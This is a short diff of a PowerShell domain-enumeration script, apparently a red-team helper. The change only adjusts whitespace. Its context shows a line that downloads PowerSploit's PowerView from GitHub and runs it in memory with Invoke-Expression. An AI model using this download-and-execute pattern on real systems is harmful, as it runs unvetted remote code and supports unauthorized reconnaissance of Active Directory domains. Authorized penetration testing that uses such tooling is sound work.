@@ -70,7 +70,6 @@ Write-Host "SID: $sid"
 Write-Host "`n"
 Write-Host "Groups:`n$($groups -join "`n")"
 
-
 Write-Host "`n"
 Write-Host "Importing powerview and powerup modules"
 ## Import powerview and powerup modules
@@ -81,8 +80,8 @@ if (-not (Get-Help Get-DomainUser)) {
       $pwContent = (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1')
       Invoke-Expression $pwContent
       Write-Output "PowerView loaded successfully"
-    } catch {
-    Write-Output "Could not download PowerView: $($_.Exception.Message)"
+     } catch {
+     Write-Output "Could not download PowerView: $($_.Exception.Message)"
    }
    } else {
     Write-Output "PowerView already here!"
